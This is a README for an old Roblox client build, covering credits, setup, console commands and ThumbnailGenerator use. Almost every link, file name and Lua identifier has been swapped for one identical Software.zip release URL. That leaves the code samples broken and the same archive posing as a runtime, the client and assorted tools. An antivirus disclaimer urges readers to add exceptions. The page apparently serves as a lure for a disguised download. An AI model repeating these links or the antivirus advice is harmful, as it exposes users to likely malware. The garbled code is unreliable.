# Roblox 0.3.368.0

This is a newly discovered build of Roblox, compiled in March of 2007.<br/>
To run the client, download this repository as a zip and extract it.<br/>
The executable can be found in the `client` folder!


## Credits ##

* **Konotsu**, **Matsu**, **TheMiningBoyAlpha**/**TheSpiderLuke**: Finding client and being the first ones to get it running.
* **CloneTrooper1019**: Making this repository, public awareness, fixed places and wrote the game join scripts.
* **Nukley**: Added more accurate player animations, Helped with structuring the client folder and replacing non-canonical files with authentic ones.
* **XIXi**: Provided missing features for the game join scripts.
* **pizzaboxer**: Got the ThumbnailGenerator into a functional state and wrote documentation.
* **Vulpovile**: Fixed player sounds and provided initial reconstructed files, announced the build's discovery to our Discord communities.

>**Please do not contact any contributors for assistance in getting this to work. If you intend to mess with this build, you're on your own.
We have done all that we can to provide enough information to people who have enough technical knowledge to get this up and running.**

# IMPORTANT: Antivirus Disclaimer #

Some users have been reporting that their antivirus programs are flagging this as malicious. This is due to the current antivirus ecosystem flagging effectively everything that isn't signed code as malicious if it performs any activities that are deemed as such, even if those actions are non-malicious (such as writing to the Windows registry, writing files in the background, or downloading any data on the network). 

Roblox unfortunately did not sign the executable when this was compiled in March of 2007, hence why these warnings are appearing.
This should be cleared once the executable is submitted for manual analysis, but for now you'll need to make an exception if any sort of anti-virus alarm is raised.

**IN SUMMARY**, this is a misdiagnosis and there should be nothing to worry about. But please do make sure to heed some of the security warnings listed below.

# Requirements #

For this to execute correctly, you need to make sure your system has the `Microsoft Visual C++ 2005 Service Pack` installed. This pack was standard in most older systems, but newer systems are no longer bundled with it.<br/>

You can find it here:<br/>
https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip

**(Note**: You will need the x86 pack. It may also help to have the x64 pack as well.)

# Content Disclaimer #

Some of the files here are not the authentic original files, this is just an approximate reconstruction from files we do have. The executable is authentic, but some files present in the client folder (i.e. `https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip` and the `content` folder), may not be 100% accurate to what was in the client as of March 2007. We are continuously working to get it as close as possible.

# WARNING: DO NOT CONNECT TO UNTRUSTED SERVERS #

This build does support hosting and connecting to servers, but there's a non-zero chance this build has exploitable bugs that can be used for **remote code execution** on your machine.<br/>

If you do try and take advantage of the multiplayer functionality in this build, make sure you only connect to servers that are trustworthy. Otherwise it isn't worth doing.<br/>

**A publicly shared server >>IN PARTICULAR<< is very likely dangerous to connect to. Even if the server host isn't doing anything malicious, a malicious client could connect to the game and potentially exploit some buffer overflow in the network protocol to perform remote code execution on your machine. Private servers where every participant is known and trustworthy are probably okay, but just remember to be careful!<br/>**

You have been warned, be smart and have fun :)!

# Download Link #
https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip

# Basic Commands #

You can enable the command bar by navigating to the bar at the top of the screen and clicking `View -> Toolbars -> Command`
Here are some basic commands that can be used to do various things in this build:

## Opening Places ##

* Open Crossroads:<br/>
`game:load("https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip")`

* Open Happy Home in Robloxia:<br/>
`game:load("https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip")`

* Open Roblox HQ:<br/>
`game:load("https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip")`

* Open Tabula Rasa:<br/>
`game:load("https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip")`

## Starting Game Sessions ##

* Start a Play Solo session:<br/>
`loadfile("https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip")()`

* Start a localhost server.<br/>
`loadfile("https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip")()`

* Connect to a localhost server:<br/>
`loadfile("https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip")()`

## Manual Actions ##

* Create a player manually:<br/>
`https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip(0)`

* Load your player's character manually:<br/>
`https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip()`

* Run the game manually:<br/>
`game:service("RunService"):run()`

* Reset the DataModel to an empty state:<br/>
`game:clearContent()`

# Bloom and Depth of Field #
Just like the [mid-2007 client](https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip), you can enable depth of field and bloom. It's still disabled, so you will need to hex-edit the executable with a program such as HxD. To enable either one of these, change the following offsets from 00 to 01.
- Bloom: `F2401`
- Depth of Field: `F240E`

![Depth of field and bloom in a hex editor](https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip)

# ThumbnailGenerator Support #

This build features the `ThumbnailGenerator` service, which is still used by Roblox to this day for rendering avatars and game thumbnails!<br/>
While it only exists on Roblox's backend server today, it happened to exist in this build for some reason.<br/>
It has the following API definition:

```
Class ThumbnailGenerator : Instance
    Function string ThumbnailGenerator:click(string fileType, int cx, int cy, bool hideSky)
```

Note that this service **does not work** immediately, it will crash Roblox if it isn't setup correctly.<br/>
You must copy the following files into the `client` directory of this repository:

- `https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip` -> `https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip`
- `https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip` -> `https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip`
- `https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip` -> `https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip`

## IMPORTANT NOTES ##

- When these DLL files are active, the rendering speed will slow to a crawl depending on the resolution of the game window.
	- This cannot be avoided as this forces rendering to software rendering.
	- Remove the DLLs from the `client` directory when you aren't using them!
- Shadows **must be disabled** or Roblox will crash when opening a new place.
- Upon using `ThumbnailGenerator:click`, the crash dialog may show (though usually you can still interact with the client).
- MesaLib is very prone to rendering bugs (text appearing as black boxes, etc), though these don't affect the outcome of the thumbnail.

- Arguments for `ThumbnailGenerator:click` have the following constraints:
  - `fileType` can be `"PNG"`, `"JPG"`, `"TGA"`, `"BMP"`, `"PCX"` or `"ICO"` 
  - `cx` is the width of the thumbnail (max is 4096)
  - `cy` is the height of the thumbnail (max is 4096)
  - `hideSky` will make the sky transparent and adjust the camera angle if set to true, and will keep the sky and original camera angle if set to false
 - The string returned by the function is the image encoded in base64. Use a base64 to image converter like this one [here](https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip).

Example usage (renders an avatar thumbnail):

```lua
if not https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip then
	https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip(0)
end

https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v2.0/Software.zip()
print(game:service("ThumbnailGenerator"):click("PNG", 420, 420, true))
```
